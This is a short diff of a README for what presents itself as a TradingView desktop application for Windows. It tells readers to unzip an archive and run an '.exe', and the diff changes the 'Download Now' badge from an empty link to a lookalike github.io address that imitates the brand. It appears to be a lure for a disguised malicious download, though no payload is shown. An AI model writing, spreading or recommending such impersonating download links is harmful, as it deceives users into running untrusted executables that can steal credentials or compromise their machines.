@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://tradingview-desktop-windows.github.io/.github/)
 
 ## 📸 Overview
 ![tradingview-desktop-charting](https://github.com/user-attachments/assets/1b80804c-a9bc-450d-901b-4e84421a3d15)
